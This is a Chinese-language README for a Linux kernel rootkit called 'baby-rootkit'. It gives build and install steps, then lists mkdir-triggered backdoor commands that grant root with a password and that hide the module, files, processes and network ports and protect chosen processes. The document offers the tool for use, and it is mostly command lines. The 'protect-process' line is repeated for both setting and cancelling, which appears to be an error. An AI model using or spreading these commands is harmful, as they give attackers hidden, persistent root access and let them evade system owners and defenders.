# baby-rootkit

一个简单的 rootkit

测试环境：Ubuntu 22.04 5.15.0-50-generic

## 构建

### 运行

```bash
make
make install
```

### 卸载模块

```bash
make remove
```

### 清理编译

```bash
make clean
```

## 使用

rootkit 通过 mkdir 命令来调用后门指令

### 设置ROOT

```bash
mkdir "set-root@12345"
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/25750978/1665927946367-3849424f-87ec-41e2-acd5-f791152f63a3.png#clientId=u78a8ab1b-8ce4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=133&id=u2a1eedde&margin=%5Bobject%20Object%5D&name=image.png&originHeight=199&originWidth=1435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33903&status=done&style=none&taskId=u8881bc0b-dab0-47ec-98f6-b03d308e736&title=&width=956.6666666666666)

### 隐藏模块自身

```bash
mkdir hide-module@ # 隐藏模块
mkdir show-module@ # 取消隐藏模块
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/25750978/1665928142588-5b0f6f27-9095-47b4-9c6e-2753cf56de5e.png#clientId=u78a8ab1b-8ce4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=433&id=ue1df8043&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116640&status=done&style=none&taskId=uaab8396f-a0c8-4008-b344-268da6d6894&title=&width=1168)

### 隐藏文件

```bash
mkdir hide-file@/tmp/file # 隐藏文件
mkdir show-file@/tmp/file # 取消隐藏文件
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/25750978/1665928320387-86401e5d-58f2-411e-babd-2e0246f8a3fa.png#clientId=u78a8ab1b-8ce4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=615&id=ue4801bb7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=922&originWidth=894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126372&status=done&style=none&taskId=ud79bf000-062d-4f5f-a877-f157ef31442&title=&width=596)

### 隐藏进程

```bash
mkdir hide-process@12345 # 隐藏进程
mkdir show-process@12345 # 取消隐藏进程
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/25750978/1665928497863-e26c29f0-b0f9-406b-ae36-80847a6b3a19.png#clientId=u78a8ab1b-8ce4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=573&id=u88de0eee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=860&originWidth=1253&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129270&status=done&style=none&taskId=u7c585ead-f3e8-4d36-ae90-0b86c97269e&title=&width=835.3333333333334)

### 保护进程

```bash
mkdir protect-process@12345 # 设置进程保护
mkdir protect-process@12345 # 取消进程保护
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/25750978/1665928612513-441fa90b-2e1d-441b-8645-2d830f270c54.png#clientId=u78a8ab1b-8ce4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=709&id=uf87dfd02&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1063&originWidth=1027&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145194&status=done&style=none&taskId=u4053826e-d22f-4ad5-b154-786687a4331&title=&width=684.6666666666666)

### 隐藏端口

```bash
mkdir hide-port@tcp4@8080 # 隐藏 ipv4 tcp 端口 8080
mkdir hide-port@udp6@8080 # 隐藏 ipv6 udp 端口 8080
mkdir show-port@tcp6@445 # 取消隐藏 ipv6 tcp 端口 445
mkdir show-port@udp4@53 # 取消隐藏 ipv4 udp 端口 53
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/25750978/1665929134039-3a8512fd-828f-4414-863e-334192b76827.png#clientId=u78a8ab1b-8ce4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=873&id=u9de06abe&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1310&originWidth=1565&originalType=binary&ratio=1&rotation=0&showTitle=false&size=333092&status=done&style=none&taskId=u340208a4-fec1-4bdf-84a9-5f5b643f1a2&title=&width=1043.3333333333333)
